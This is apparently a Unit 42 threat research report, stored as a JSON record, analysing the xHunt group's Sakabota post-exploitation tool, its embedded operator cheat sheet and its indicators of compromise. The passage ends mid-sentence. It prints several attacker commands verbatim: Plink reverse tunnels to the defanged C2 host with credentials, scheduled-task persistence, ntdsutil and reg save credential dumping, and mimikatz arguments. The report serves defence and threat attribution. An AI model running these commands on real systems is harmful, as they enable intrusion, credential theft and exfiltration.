{
    "id": "51278b11-3da7-4bbb-9615-0114fcd06201",
    "created_at": "2023-01-12T15:01:00.723707Z",
    "updated_at": "2025-03-27T02:16:04.524621Z",
    "deleted_at": null,
    "sha1_hash": "daeefcde600de47f74f233a52e19afbd65e05b22",
    "title": "2019-12-04 - xHunt Campaign- xHunt Actor’s Cheat Sheet",
    "authors": "",
    "file_creation_date": "2022-05-28T00:35:49Z",
    "file_modification_date": "2022-05-28T00:35:49Z",
    "file_size": 912955,
    "plain_text": "# xHunt Campaign: xHunt Actor’s Cheat Sheet\n\n**unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/**\n\nRobert Falcone December 5, 2019\n\nBy [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nDecember 4, 2019 at 8:00 PM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [Credential Harvesting,](https://unit42.paloaltonetworks.com/tag/credential-harvesting/) [Sakabota,](https://unit42.paloaltonetworks.com/tag/sakabota/) [xHunt](https://unit42.paloaltonetworks.com/tag/xhunt/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/xhunt-actors-cheat-sheet/)\n\n## Executive Summary\n\nUnit 42 has been researching the xHunt attack campaign on Kuwait organizations for several\nmonths. Recently, we found evidence that the developers who created the Sakabota tool,\n[which was previously discussed in the xHunt campaign, had carried out two sets of testing](https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/)\nactivities in July and August 2018 on Sakabota in an attempt to evade detection. These\ntesting activities involved the developer compiling several variations of the tool with slight\nchanges made to the code base, each of which the developer will submit to online antivirus\nscanning services to determine the vendors that detect their tool. The name Sakabota\n[appears to be referencing a sword named Sakabato in an anime called “Rurouni Kenshin,”](https://kenshin.fandom.com/wiki/Sakabat%C5%8D)\n[which fits the anime-themed tool names seen in the 2019 XHunt campaign.](https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/)\n\n\n-----\n\nWhile analyzing the Sakabota samples created by the developer in these testing activities,\nwe found a cheat sheet that the developers included within the tool, which we suspect was\nmeant to help the operator of the tool carry out activities on the compromised system and\nnetwork. This is the first time we’ve seen a malware developer include a cheat sheet of\nexample commands to assist the operator in carrying out the activities on the compromised\nsystem and network. We believe the inclusion of this cheat sheet within the tool may suggest\nthat the developer and operator of the Sakabota tool are different individuals.\n\nThe cheat sheet includes examples of commands needed for persistence, network\nreconnaissance, pivoting, credential dumping, general system and network data gathering,\nas well as data exfiltration and commands to configure the system to allow remote desktop\nprotocol (RDP) sessions. The commands provide insight into the techniques the actors will\nuse after compromising a system, as well as the tools used to achieve their objectives. The\ncommands also suggest that the threat group heavily relies on RDP to interact with\ncompromised hosts, likely using secure shell (SSH) tunnels created with the Plink tool\nbetween the infected system and an actor-controlled domain. Also, the command examples\nshow the threat group seeks to move across an infiltrated network to target additional\ndevices, making it a greater threat to organizations once infected. According to these\ncommands, the actor would likely make these pivots to other systems by performing\ncredential dumping from the Windows registry and process memory.\n\nSome of the command examples include a domain or IP address, one of which overlaps with\na domain that the group used to deliver CASHY200 payloads configured with\nfirewallsupports[.]com as its command & control system (C2) that we discussed in our\nprevious blog on xHunt. The cheat sheet also suggests the actors will use scheduled tasks\nfor persistence, which included one scheduled task name that was used for persistence in\nthe previously mentioned CASHY200 payload.\n\nWe have provided an analysis of the Sakabota tool, specifically version 1.4, including all of\nits functionality in the Appendix.\n\n**Testing Sakabota**\n\nWhile gathering Sakabota samples during our xHunt research, we came across several\nsamples compiled between July and August 2018, which the developer created during two\nrounds of testing. The first round of these testing activities occurred on July 21 and 23, 2018,\nwhile the second round of testing occurred on August 6 and 7, 2018. Unlike our analysis of\ntesting activities performed by other threat groups, we will provide a higher level synopsis of\nthe activities rather than providing the minute changes made in each iteration.\n\nBoth rounds of testing included iterations where the developer either made slight changes to\nthe codebase itself or used different obfuscation tools to see how these changes affected the\ndetection rate of the Sakabota tool. In addition to changes made to the codebase and\nobfuscators, the developer also modified the embedded resources within the Sakabota tool\n\n\n-----\n\nto determine if they were causing detection as well. Based on the changes between the last\nsample from the first round on July 23rd and the first sample in the second round of testing\non August 6th, we believe the two rounds of testing are one continuous testing activity with a\ntwo-week gap between them rather than two separate testing efforts.\n\nThe first round of testing started with the oldest known version of Sakabota, specifically\n1.4.0.0, and resulted in a new version of 1.5.0.0. The second round of testing started with\nSakabota 1.5.0.0 and resulted in a new version of 1.6.0.0. During the two rounds, the\ndeveloper tested several different crypters and obfuscators, including “Confuser,”\n“ConfuserEx,” “CodeVeil,” and two different versions of “.NET Reactor.” Ultimately, in the\nsecond round of testing the developer determined that one of the “.NET Reactor” versions\n(possibly 4.8 or 4.9) resulted in the lowest detection rate, which prompted the developer to\ncontinue using this version of “.NET Reactor” for the remainder of the testing activities.\n\nIn addition to making changes to the code base and testing various obfuscators, the tester\nalso made modifications to or removed resources embedded within the samples. The most\ninteresting change to resources occurred in the first iteration of the July testing, where the\ndeveloper modified the ‘k’ resource that was initially a text file that contained a cheat sheet\nfor the actor to a blank document that contained nothing more than a byte order mark\n(U+FEFF).\n\n**Sakabota Cheat Sheet**\n\nDuring our analysis of the testing activities related to Sakabota, the oldest known sample\n(SHA256:\n\n5b5f6869d8e7e5746cc9bec58694e4e0049aef0dcac5dfd595322607ba10e1ae) had an\nembedded resource named ‘k’. This resource contained text that at first glance appeared to\nbe usage instructions for the tool, however, on further inspection it is a cheat sheet for the\noperators using Sakabota in how to perform a variety of activities once they have access to\nthe targeted system and network. This cheat sheet gave us unprecedented insight into the\ntools and techniques the actor using Sakabota uses once they gained access to the\ncompromised system. The cheat sheet also included domains and IP addresses within the\nexample commands, which confirms our analysis that these network artifacts belong to this\nthreat group’s infrastructure.\n\nTo access this cheat sheet, an operator would click the Knoldege button within Sakabota’s\nGUI, which would display the cheat sheet in a scrolling text box immediately to the right of\nthe button. Figure 1 shows the Sakabota GUI with the Knoldege button clicked and the cheat\nsheet displayed in green text.\n\n\n-----\n\n_Figure 1. Sakabota’s GUI displaying cheat sheet_\n\nThe cheat sheet is separated into several sections, based on the purpose of the example\ncommands. Fortunately, the commands listed in the cheat sheet provides us with a great\ndeal of insight into some of the tools and techniques the actors will possibly use after\ncompromising the end system. The cheat sheet shows significant batch and PowerShell\nscripting and a preference for using RDP, as well as the following tools not provided natively\nin Windows (i.e. [thc-hydra, Plink, Mimikatz,](https://github.com/vanhauser-thc/thc-hydra) [Powercat,](https://github.com/secabstraction/PowerCat) [ProcDump,](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) [SharpHound/BloodHound](https://github.com/BloodHoundAD/SharpHound)\n[and PowerSploit). Table 1 shows the headers and a description of each section within the](https://github.com/PowerShellMafia/PowerSploit)\ncheat sheet.\n\n\n**Section**\n**Heading**\n\n\n**Description**\n\n\nHydra Provides an example command on how to run the thc-hydra tool to brute\nforce an RDP login on a single IP address using text files with the username\nand password combinations.\n\n\nPass The\nHash\n\nWMIC with\nBat\n\n\nProvides two examples of arguments needed to pass-the-hash to run a\ncommand on a remote system using Mimikatz. The command in both\nexamples use the psexec tool to run 'cmd.exe' on the remote system.\n\nProvides an example windows management interface command (WMIC) with\narguments to run a batch script (\"c:\\temp\\a.bat\") using the 'process call\ncreate' with supplied username and password.\n\n\n-----\n\nPlink Provides example command-line commands to use Plink (PuTTY Link) to\ncreate an SSH tunnel between a remote system and the local system to\nallow the actor to remotely access the compromised system via remote\ndesktop (RDP). The command instructs Plink to connect to the remote\nsystem, in the two examples were 'pasta58[.]com' and '176.9.235[.]101' over\nTCP port 25 and to authenticate to these remote systems using the\nusername of 'bor' and the password '123321'. The example commands use\n'svphost' as the application name, which is the same filename that Sakabota\nwould use to install Plink to the system (\"svphost.exe\").\n\n\nLSASS\nProcess\n\n\nProvides five example commands that use ProcDump, Mimikatz and\nPowerSploit's Out-Minidump function to dump the 'lsass.exe' process\nmemory. Two of the command specifically dump the contents to a file located\nat 'c:\\mydump.dmp', while another saves the memory to a file named\n'lsass.dmp'.\n\n\nWDigest Provides the command line commands to use the 'reg' application to query\nand modify the WDigest registry key 'UseLogonCredential' that instructs\nWindows to store credentials in memory in cleartext or not. Setting this key to\n'0' is a suggested mitigation to Mimikatz credential dumping, which is likely\nwhy the cheat sheet provides the 'reg' command to set this key to '1' to\nenable it.\n\nPowercat Provides example commands for both the client and the server to create a\nremote shell and transfer files using the powercat PowerShell tool. The\nremote systems that the commands would connect to are 'pasta58[.]com'\nand '213.202.217[.]31' over TCP port 443. This section also provides an\nexample PowerShell command to download powercat from\n'hxxp://pasta58[.]com/pk.txt' and to save the result to 'c:\\users\\public\\pc.ps1'\nbefore creating a remote shell to 'pasta58[.]com'.\n\nNtds Provides example commands to save the 'Security Account Manager' (SAM)\nregistry hive using the 'reg' application and Mimikatz's 'lsadump::sam'\ncommand. This section of the cheat sheet also includes login credentials to\n'CMD5.org', which we believe the actor would use to crack hashes extracted\nfrom the registry dump files.\n\ntaskch Provides example commands to delete, create and run scheduled tasks. The\nscheduled tasks in the examples have the names 'WindowsUpdateTolkit' and\n'WindowsUpdateTolkit_1' and would run 'SystemRecoverytolkit.ps1' and\n'TempSystemRecovery.vbs', all but 'WindowsUpdateTolkit_1' were used to\ncreate persistence for CASHY200 payloads in xHunt related attacks.\n\n\nDownload\nfrom CMD\n\nFTP\nPowershell\n\n\nProvides a PowerShell command to download a file from\n'hxxp://pasta58[.]com/r.t' and save to 'c:\\windows\\temp\\temp\\run.bat'.\n\nProvides a PowerShell command that uploads a file 'C:\\users\\public\\P.txt' to\n'ftp://pasta58[.]com/P.txt' using the login username 'admin' and 'sak' as a\npassword.\n\n\n-----\n\nFTP From\nCMD\n\n\nProvides command line commands using echo to create a file named\n'ftpcmd.dat' that contains the necessary commands to log into the FTP server\nat 'pasta58[.]com' using 'administrator' as the username and\n'QwErTyUiOp123456' as the password to upload a file named 'TRR.txt'.\n\n\nFireWall Provides six example commands to add, delete and show rules from the\nlocal Windows Firewall using the 'netsh' application. The example commands\ninclude the creation of rules to allow inbound network traffic to the Plink\napplication saved to 'svphost.exe' discussed in the Plink section, as well as\ninbound traffic over TCP port 22.\n\nRDP NLA Provides a PowerShell command that disables Network Level Authentication\n(NLA) for RDP. The command uses WMI to call the\n'SetUserAuthenticationRequired' method to disable the\n'UserAuthenticationRequired' property in 'Win32_TSGeneralSetting'. NLA\nrequires the user to authenticate prior to the creation of an RDP session with\na server, so we believe the actor would disable NLA to allow RDP sessions\nover the tunnel created with Plink.\n\nRDP Port Provides example commands using the 'reg' application to query and add\nvalues to keys in 'hklm\\system\\currentControlSet\\Control\\Terminal Server'.\nThe queries in the cheat sheet would allow the actor to view the port number\nthat RDP uses and if the 'AllowTSConnections' setting is enabled to allow\nRDP sessions. The cheat sheet also has two 'reg' commands to add values\nto the registry keys 'AllowTSConnections' and 'fDenyTSConnections' to\nenable RDP sessions.\n\nWinRAR Provides WinRAR command line commands to recursively archive folders.\nOne of the examples outputs multi-volume RAR archives split into\n153,600KB files.\n\nDB Contains a variety of SQL queries related to navigating an unknown\ndatabase. Based on the tables and column names, it appears that these\nqueries attempt to extract customer information and call detail records\n(CDR), which is likely associated with telecommunications.\n\nGet Users Provides the commands to run the Local.exe and Dsquery.exe tools to gather\nuser information from a specified remote system or domain.\n\nScan For Provides three commands that use for loops to scan a local subnet\n(specifically a /24) to locate systems responding to ping requests, to check\nfor file shares using the 'net use' application with 'administrator' as the\nusername and 'P@ssw0rd' as the password and to check for systems whose\n'C:' drive is shared using the 'dir' command.\n\n\nRoute\nPrint\n\n\nThis section was blank.\n\n\n-----\n\nScripting Provides two \"scripts\", one that reads locations from 'c:\\test.txt' that it will\niterate through and use as the argument to the 'ping' command, while the\nsecond pings \"www.google.com\" and checks the response for the string\n\"Reply\".\n\nBase 64 Provides two commands that use the 'certutil' application and the '-encode'\nand '-decode' to convert 'test.exe' to 'test.txt' and vice versa.\n\nPantest Includes some Google search operators that the actor could likely use to find\nweb servers of interest. The search operators include 'site' searches for '.sa',\n'.kw', '.ph' and '.ir', 'ext' for 'asp', 'aspx', 'php' and 'jsp', 'inurl' for 'login' and\n'admin' and 'intext' for '---', 'Mysql_num_rows' and 'Apache/2.4.12 (Win32)\nOpenSSL/1.0.1m PHP/5.6.11'. The cheat sheet also provides several\nexamples of SQL injection techniques with a ticular focus on XAMPP\nservers.\n\n_Table 1. Sections within Sakabota’s cheat sheet and a description of their contents_\n\nWhile the cheat sheet does not include a specific header, it does include example commands\nexplaining how to use PowerShell to run Sharphound, which is the C# variant of the\nBloodhound tool. Bloodhound is an open-source tool used to discover relationships between\nobjects in an Active Directory environment. Many red teamers use Bloodhound to determine\nattack paths from a controlled asset on the breached network to their objective. The specific\narguments in the example command instruct Bloodhound to use the following collection\nmethods:\n\nACL - Collect ACL (Access Control List) data\nObjectProps - Collects node property information for users and computers\nDefault - Collects Group Membership, Local Admin, Sessions, and Domain Trusts\n\nThe inclusion of these commands in the cheat sheet suggests that the actors would also\nleverage Bloodhound for the same reason a red teamer would: specifically mapping out\nattack paths once they gain access to the network. These attack paths allow the adversary to\ndetermine what systems and accounts they should focus their efforts on to eventually gain\naccess to the systems and accounts needed to achieve their objectives.\n\nThe cheat sheet also included the following domain and IP addresses of interest in the\nexample commands that we associate with the threat actor’s infrastructure:\n\npasta58[.]com\n176.9.235[.]101\n213.202.217[.]31\n\nThe 213.202.217[.]31 IP address resolved the domain dl.kcc.com[.]kw that was used to host\nthe delivery documents installing the CASHY200 payload in the July 2018 attacks discussed\nin our previous blog on xHunt. The 176.9.235[.]101 IP address was resolved to by\n\n\n-----\n\npasta58[.]com, which is a known Sakabota C2 domain. We also observed this IP address\nand domain included as auto-complete entries within certain fields of Sakabota’s GUI (see\nAppendix), of which also included the IP address 23.227.207[.]233 also previously resolved\nto by pasta58[.]com. While this does not provide any new infrastructure, it strengthens our\nlinkages between these entities within the infrastructure and their association with the threat\nactors involved.\n\n## Conclusion\n\nWhile researching the tools associated with the xHunt campaign, we discovered testing\nactivities carried out by a developer that is associated with this attack campaign. During this\ntesting activity, we found a sample of Sakabota that contained a cheat sheet for the\noperators that provided significant insight into the tools, tactics, and techniques likely\nassociated with these threat actors. We occasionally see malware developers including\nusage instructions within their tools to help an operator understand how to use various\nfunctionalities within the tool, but we’ve never seen a malware developer include a cheat\nsheet of example commands to assist the operator in carrying out the activities on the\ncompromised system and network. Not only did this cheat sheet give us unprecedented\ninsight into the tools and commands they would likely execute on the system, but it also\nprovided references to network locations within their infrastructure.\n\nPalo Alto Networks customers are protected from the tools mentioned in this blog through\nthe following:\n\n[Customers using AutoFocus can view this activity by using the Sakabota tag](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Sakabota)\n[C2 domain pasta58[.]com is classified as malicious in Threat Prevention,](https://www.paloaltonetworks.com/products/threat-prevention-services) DNS\nSecurity and [URL Filtering.](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security)\nAll Sakabota samples identified are detected as malicious by WildFire and Traps.\n\n## Appendix\n\n Indicators of Compromise\n\n### Sakabota Infrastructure\n\npasta58[.]com\n\n176.9.235[.]101\n\n213.202.217[.]31\n\n23.227.207[.]233\n\n### Sakabota SHA256\n\n\n-----\n\n7cfd75ab4822b489f74e83d3046536509c44b29b72b43125b0eca1fe449b5953\n\n5b5f6869d8e7e5746cc9bec58694e4e0049aef0dcac5dfd595322607ba10e1ae\n\n335e9eb0bb571ca81cc6829483f0b8d015627f8301373756d04d844cde04918d\n\n40b18a1c06888f8e116b6de21f70359b9763b8066c764542ff3816c118b7d482\n\n8e18b28dc7351b0e7928b0f5373a6e987ba6d084d84bfd0b29e7f458ca5401e5\n\nea31e5afec3b94635e98473183ec420e9c3e6fd13b618dadb5b34bf5c257a5aa\n\n66e57d2909e37d39791bee91eb9e8121aa48ea89eae8a09275ae078e9dda2f50\n\n2d7ff8d3aee31cd2f384d74e6b0f07ecda2cea860fb3210c9afe66bc7cc6f90b\n\ndf0f874219ffac8038290eb4a39ba6686edc35de8913563f8ddc9644ad4bde64\n\nd0f57e566c6b457d6e97dc02266d67d81ef561fba50a86e9f9fc889dc5167068\n\nd80aeb4fb326af0bf1179c4fcf2ad01cf98ddab81f709e690bbd728c027064e9\n\ncc21bc11d9aed226e9c511480e54bb1305cea086ab0b5e310de68228debdc80e\n\nbf7a448ef2603cce5488d97474c913ba14c9550d03cc5e387fe31eb416dc0259\n\n161cfe70ea0022ef7aefffba93b3958ab09d7df6e61cc88d1c27e4917f554de4\n\n224539e69c184d75ac59378ecab7914bcbe360310bb82add395d59e9e11d1419\n\nb9c56da9e911dc85b06f8dc9d1a486663af8f982511e1c3ad568e635e2323274\n\n9a431838f2613454c5630a5f186f0aee240dfc5723bd6e1b586bb4118cc3aab7\n\ndb1f460f624a4c13c3004899c5d0a4c3668ba99bb1e6be7f594e965c637b6917\n\nb73facbf55053519b5da29397cfd3beea519e9f1bd41c50b6c2f3f1b4eca15a3\n\n761635c23f3c98a8d18e48c767fff2b0ec321b58064b404ea1b2b4a555913296\n\n47ca763da840fdee68b97e8d53cbc56b3f90e4d6532f0b1501b90175b8fca24f\n\n## Sakabota Tool\n\nThe Sakabota Tool allows threat actors involved with the xHunt campaign the ability to carry\nout post-exploitation activities, such as performing network reconnaissance, dumping\ncredentials and interacting with discovered systems. Like other tools seen in the xHunt\ncampaign an actor can use the Sakabota tool from the command line or by interacting with\n\n\n-----\n\nits graphical user interface (GUI). We will discuss Sakabota s functionality available from the\ncommand line and GUI, as the offered functionality differs dramatically. While we did not\nobserve this activity, we speculate that the actor would use the command line interface to do\ninitial data gathering after compromising a system and would use it to create a tunnel to\nestablish an RDP session. After connecting to the system via RDP, we believe the actor\nwould then use Sakabota’s GUI to take advantage of its increased capabilities.\n\n### Command Line Functionality\n\nThe actor can use Sakabota’s command-line interface by including any command-line\narguments, otherwise, Sakabota will display its GUI instead of the command-line. The\ndeveloper of Sakabota included usage instructions that actors can view by including the help switch, as seen in Figure 2.\n\n_Figure 2. Sakabota’s command-line interface displaying usage instructions_\n\nThe -Up command will upload a file or a folder’s files to the hardcoded C2 location of\nftp://www.pasta58[.]com/<filename> using the FTP protocol and a username and password\nof Administrator and Mono8&^Uj.\n\nThe -Tanbo command writes an embedded NirCmd application by NirSoft to SC.exe in the\ncurrent directory and uses this tool to take a screenshot of the system. The command will\nsave the screenshot to the current directory named Screen_<computer\nname>_<username>.png. The -Tanbo-up command performs the same screenshot activity,\nbut will upload the file to the C2 using FTP and the same credentials as the -Up command\nand delete the screenshot file from the system.\n\n\n-----\n\nThe -Shuriken and -Shuriken-v commands allow the actor to scan a remote system at\n23.227.207[.]233 for open TCP ports, likely to determine the TCP ports allowed outbound\nfrom a stateful firewall. The ‘-Shuriken’ command will scan a list of TCP ports, specifically\n123, 443, 80, 81, 23, 21, 22, 20, 110 and 25, while the -Shuriken-v command allows the\nactor to specify the TCP port to scan. The IP address 23.227.207[.]233 resolved to\npasta58[.]com, which is the C2 domain used by this Sakabota sample.\n\nThe -Rev command saves an embedded PuTTY Link tool, also known as Plink to\nc:\\users\\public\\svphost.exe and uses this tool and the following command-line arguments to\ncreate an SSH tunnel to allow the actor to create a remote RDP session on the system:\n\nsvphost pasta58[.]com -C -R 0.0.0.0:1991:127.0.0.1:3389 -l bor -pw 123321 -P <TCP port\nprovided on command line>\n\nThe -Rev-loop command attempts to continually create an SSH tunnel to create a remote\nRDP session every ten minutes by creating a scheduled task named update.windows with\nthe following command:\n\nschtasks /create /sc minute /mo 10 /f /tr \"cmd /c cd c:\\users\\public & echo y | svphost\npasta58.com -C -R 0.0.0.0:1991:127.0.0.1:3389 -l bor -pw 123321 -P <TCP port provided on\ncommand line>\" /tn update.windows /ru SYSTEM\"\n\n### GUI Functionality\n\nThe Sakabota tool has more functionality available to the actor from its GUI. The developers\nof Sakabota wanted to restrict others from using their tool, so they added a password screen\nthat requires the individual to enter a password before being able to use the functionality\nprovided by Sakabota’s GUI. Figure 3 shows Sakabota’s password dialog, which has the title\nSnapping Tool and requires a password of 92, both of which are the same as the Gon tool\ndiscussed in the Appendix of our initial xHunt blog.\n\n\n-----\n\n_Figure 3. Password screen displayed when opening the Sakabota GUI_\n\nAfter entering the correct password, Sakbota displays its main interface, as seen in Figure 4.\nSakabota’s main interface has a window title that begins with the string “Sakabota --->“\nfollowed by system information, which includes the domain name, computer name,\nusername, and if the system has Internet access. Much like the password screen, the\n[window title is very similar in structure to the Gon tool, with the Gon tool’s window title](https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/)\nstarting with the string “xHunter --->” and Sakabota including the boolean for Internet\nconnectivity.\n\n\n-----\n\n_Figure 4. Sakabota’s main interface_\n\nSakabota’s main interface has a tabular design, with each tab containing different\nfunctionality. Common amongst all the tabs is the bottom portion of the interface, which has\nseveral buttons and additional system information, such as the system’s local IP address and\nthe IP address for its DNS server, as well as the usernames currently logged into the system.\nThis area also has several buttons that the actor can use to perform clean-up and selfdestruct actions, as well as apply some generic settings. Table 2 provides a list of the buttons\nand a description of their functionality.\n\n**Button** **Description**\n\n\nClear\nTracks\n\n\nCleans up actors activities by deleting registry keys used to store recent\nsystems connected to via RDP (\"Software\\Microsoft\\Terminal Server\nClient\\Default\"), recent applications run\n(\"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\"), recent\ntyped paths in Windows Explorer\n(\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TYPEDPATHS\")\nand recent search terms\n(\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery\").\n\n\nRDP SC Enables CredSSP for RDP sessions to use the current credentials to\nauthenticate to the remote system by writing enablecredsspsupport:i:0 to the\nDefault.rdp file.\n\nR Opens an explorer window with the results directory for scans and other\ncommands.\n\nKnoldege Displays a cheat sheet for the actor in text box directly next to the button.\n\n# Enables/disables option called Personal Use that enables/disables an inactivity\ntimer that Sakabota uses to hide its user interface to avoid detection.\n\n\n-----\n\n@ Enables the RDP interrupt functionality that will close Sakabota and clean up\nthe actors by running the same function as the Clear Tracks button, but also\ndeletes the folder used to store command results and the Sakabota tool itself.\n\n( Enables and disables Silent Mode, which if enabled will ask the user if they\nwould like to save scanning results to a file in addition.\n\nHara-K Self-destruct mechanism, which will delete the Sakabota executable before\nexiting. Abbreviated ‘Harakiri’, which is a term for suicide in Japanese.\n\n_Table 2. Buttons at the bottom of Sakabota’s main interface_\n\nThe ‘Info’ tab seen in Figure 4 has several capabilities specifically focused on gathering\ninformation from systems on the network. This tab allows the actor to use an embedded\n‘dsquery’ tool (SHA256:\n\n4c8c4e574b9d1dc05257a5c17203570ff6384d031c6e6284fbc0020fe63b719e)\n\nto query Active Directory to gather information on computers, user and groups attached to\nthe domain. This tab also allows the actor to scan IP addresses for specific services such as\nRDP, SMB, FTP, HTTP(s), telnet, and SSH. This tab also allows the actor to perform TCP\nport scan for systems on specified network ranges and connect to remote systems using the\nnet use command. Lastly, the actor can install a legitimate Microsoft tool called Local.exe\n(SHA256: 450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd) and\nuse this tool to list the administrator accounts on a specified IP address on the local network.\n\nSakabota’s remotes tab, seen in Figure 5, is dedicated to providing the actor the ability to\ninteract with remote systems. First, this tab allows the actor to use Windows Management\nInstrumentation (WMI) to run commands on remote systems, in which the actor would\nprovide the desired command in the ‘Code’ text box. The ‘Code’ text box contains autocomplete suggestions that provides us insight into some of the commands the developer\nexpects the actor to run, such as gathering information on the user and network interfaces;\nhowever, the following commands within the auto-complete suggestions (with the exception\nof Whoami and query user) contain errors, such as missing spaces or added spaces or are\nnot valid commands that would result in errors rather than running the application correctly:\n\nWhoami\n\nipconfig/all\n\nquery user\n\nnet stat -na\n\nScreen Shot\n\nThe ‘PSEXEC’ portion of this tab allows the actor to install an embedded PSExec tool to the\nsystem and use it to connect to a remote system using supplied credentials. The Remote\nbutton uses PSExec to launch a command prompt process on the remote system, while the\nClean button attempts to kill the process running PSEXESVC.exe and delete this executable\non the remote system. The PLink portion of the tab allows an actor to install an embedded\n\n\n-----\n\nPuTTY Link (PLink) tool (SHA256:\n04e5f50dd90d5b88b745ef108c06a3ef1e297018cb3fe8acc80dd55250dfee68) to the system\nand use it to create an SSH tunnel between the system and an external server over TCP port\n3389. We believe the actor uses this tunnel to connect to non-Internet facing systems using\nRDP. Sakabota uses the As_backdoor radio box to create a scheduled task named\nupdate.windows that attempts to create the tunnel every 20 minutes, whereas Sakabota\nuses the As_System rox to create a scheduled task named mytask that runs once at 12:00\nAM. The actor would provide the location of their server in the Server IP box that Sakabota\nwill use to create a tunnel to which the developer included the following locations within autocomplete options:\n\n176.9.235[.]101\npasta58[.]com\n\nThe ‘PASS THE HASH’ portion of the ‘Remotes’ tab suggests that the tool attempts to use\nthe [pass-the-hash technique to authenticate to a remote system, however, the tool does not](https://attack.mitre.org/techniques/T1075/)\nhave any functional code that uses these text boxes and the ‘Pass’ button does not have any\nevent handling if its clicked.\n\n_Figure 5. Sakabota’s ‘Remotes’ tab_\n\nSakabota’s Passwords tab, seen in Figure 6 has functionality dedicated to dumping\ncredentials from the system. The ‘MIMI’ portion of this tab allows the actor to load a supplied\nmimikatz executable and execute it with the arguments ‘log privilege::debug\nsekurlsa::logonpasswords exit’. The ‘Digest’ button allows the actor to attempt to circumvent\na Mimikatz mitigation by setting the following registry key to ‘1’, which instructs Windows to\nstore credentials in memory:\n\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential\n\n\n-----\n\nThe SAM portion allows an actor to dump the SAM hive from the registry by using either the\nsupplied Mimikatz tool with the arguments ‘log privilege::debug token::whoami token::elevate\nlsadump::sam exit’, or by running the following two command-line commands:\n\nReg save hklm\\sam <supplied folder name>\\sam\nReg save hklm\\system <supplied folder name>\\system\n\nThe ‘NTDS’ portion allows an actor to obtain a copy of a domain controller by creating an\ninstallation media using the ‘ntdsutil’ application. We have seen adversaries use this\ntechnique to create a clone of the domain controller that they exfiltrate for backup and offline\nprocessing purposes. The actor will select a folder to save the output and click the\n‘SnapShot’ button that will run the following command to take a snapshot of the domain\ncontroller:\n\nntdsutil \"activate instance ntds\" ifm \"create full <actor provided path>\\ntds\" quit quit\n\n_Figure 6. Sakabota’s ‘Passwords’ tab_\n\nThe ‘File MNG’ tab seen in Figure 7 allows the actor to interact directly with the filesystem to\ncreate RAR archives of files and folders and to upload specific files to the C2 via FTP. The\n‘RAR’ portion allows the actor to select a folder to archive its files by first saving an\nembedded ‘rar.exe’ (SHA256:\nea139458b4e88736a3d48e81569178fd5c11156990b6a90e2d35f41b1ad9bac1) to the\nsystem as “R.exe” and runs ‘cd <Read text box> & R.exe a -r -v <Size text box> <Write text\nbox>’. The ‘FTP’ portion of the tab allows the actor to select files from the system to upload\nto its C2 server hosted at ‘pasta58[.]com’ over FTP. Table 3 shows the functionality that the\nvarious radio and checkboxes enable if selected in the FTP section. The ‘B64’ section is\nmeant to allow the actor to base64 encode and decode files on the system; however, it’s\nfunctionality does not seem to work appropriately. The dropdown has two options: ‘CERT’\nand ‘STD’ with the former using the legitimate Microsoft ‘certutil’ application to encode or\n\n\n-----\n\ndecode the file while the latter uses the ToBase64String and FromBase64String methods\nwithin the System.Convert class. Neither the ‘CERT’ and ‘STD’ options work correctly, with\nthe ‘STD’ option having the same exact code used for the encode and decode buttons. The\n‘STD’ method is quite interesting, as both the ‘Encode’ and ‘Decode’ buttons read the file\ncontents and encode them by calling the ToBase64String method, but then immediately calls\nFromBase64String on the encoded contents, which effectively results in the cleartext of the\nfile. We are unsure of the purpose of this functionality, as it appears to be a coding error\nmade by the developer.\n\n**Checkbox** **Description**\n\nSYS Writes paths to selected files to 'List.txt' and creates a scheduled task named\n'mytask' to run the Sakabota executable with the '-up-l List.txt'\n\nCMD Creates a scheduled task named 'mytask' to run a batch script \"c:\\FOPO.bat\"\nthat saves FTP commands to 'ftpcmd.dat' to upload the selected files\n\nNOR Normal FTP upload\n\nKWF Abbreviation for “Kill When Finished”, which exits the Sakabota application\nafter uploading the files\n\nDEL Deletes the file after uploading\n\n_Table 3. Radio and Checkboxes and their functionality in the ‘FTP’ section of Sakabota_\n\n_Figure 7. Sakabota’s ‘File MNG’ tab_\n\nSakabota’s ‘Resources’ tab seen in Figure 8 has two buttons ‘Shell’ and ‘Agent’ that install a\nwebshell and PowerShell backdoor, respectively.\n\n\n-----\n\n_Figure 8. Sakabota’s ‘Resources’ tab_\n\nThe webshell is in the Sakabota binary within a resource named ‘Shell’ (SHA256:\n\nb2fb0da6832e554194b59c817922770af13d474179a1c0381809676ef2709d24) and is meant\nfor the actor to install on an IIS server running ASP.NET, as the webshell was written in C#.\nBy clicking the button, Sakabota will write the embedded Shell to a filenamed ‘Shell.aspx’,\nwhich the actor would then have to move to an IIS directory. The webshell requires\nauthentication before the actor to run commands and upload files to the web server. The\nauthentication process involves checking the MD5 hash of the string in the ‘id’ parameter of\nthe URL with a hardcoded MD5 hash ‘6242182812353019113116910419137224228’ in the\nwebshell. This authentication process is flawed and cannot work, as the hardcoded MD5\nhash is not valid as it contains 37 characters instead of 32, so the actor cannot authenticated\nto the shell and is therefore unusable in its current form. Figure 9 shows the webshell’s\ninterface, which we had to remove the webshell’s authentication mechanism to display.\n\n_Figure 9. Interface of webshell embedded within Sakabota’s ‘Resources’ tab_\n\nWhen the actor clicks the Agent button, Sakabota saves an embedded executable from\nwithin a resource named svhost to svhost.exe. This executable 